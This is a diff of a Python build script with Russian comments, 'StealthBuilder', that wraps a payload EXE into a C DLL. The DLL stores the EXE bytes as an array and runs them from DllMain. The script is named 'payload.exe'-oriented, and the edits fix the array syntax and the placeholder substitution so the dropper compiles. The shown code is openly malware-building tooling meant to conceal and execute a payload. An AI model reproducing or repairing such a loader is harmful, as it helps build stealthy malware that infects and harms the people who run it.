@@ -1,4 +1,4 @@
-# build.py - Сборка EXE с зашифрованной DLL (СТАБИЛЬНАЯ ВЕРСИЯ)
+# build.py - Сборка EXE с зашифрованной DLL (ИСПРАВЛЕННАЯ ВЕРСИЯ)
 import os
 import sys
 import subprocess
@@ -69,20 +69,22 @@ class StealthBuilder:
         return "payload.exe"
     
     def convert_exe_to_dll(self, exe_path):
-        """Конвертирует EXE в DLL (БЕЗ ЭМОДЗИ И СПЕЦСИМВОЛОВ)"""
+        """Конвертирует EXE в DLL (ПРАВИЛЬНЫЙ СИНТАКСИС)"""
         print("[+] Converting EXE to DLL...")
         
         # Читаем EXE
         with open(exe_path, 'rb') as f:
             exe_data = f.read()
         
-        # Создаем DLL обертку на C (БЕЗ СПЕЦСИМВОЛОВ!)
+        # Создаем DLL обертку на C с ПРАВИЛЬНЫМ синтаксисом массива
         dll_template = '''
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 
-static unsigned char exe_data[] = {DATA};
+static unsigned char exe_data[] = {
+DATA
+};
 static unsigned int exe_size = SIZE;
 
 static void RunEXE() {
@@ -123,7 +125,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
     return TRUE;
 }
 '''
-        # Конвертируем EXE в HEX строку (без спецсимволов)
+        # Конвертируем EXE в HEX строку с ПРАВИЛЬНЫМ синтаксисом
         hex_parts = []
         for i, b in enumerate(exe_data):
             if i > 0 and i % 16 == 0:
@@ -133,10 +135,10 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
         hex_string = ''.join(hex_parts).rstrip(', ')
         
         # Заменяем плейсхолдеры
-        dll_code = dll_template.replace('{DATA}', hex_string)
-        dll_code = dll_code.replace('{SIZE}', str(len(exe_data)))
+        dll_code = dll_template.replace('DATA', hex_string)
+        dll_code = dll_code.replace('SIZE', str(len(exe_data)))
         
-        # Сохраняем DLL код (в бинарном режиме для безопасности)
+        # Сохраняем DLL код
         with open('payload_dll.c', 'w', encoding='utf-8') as f:
             f.write(dll_code)
         
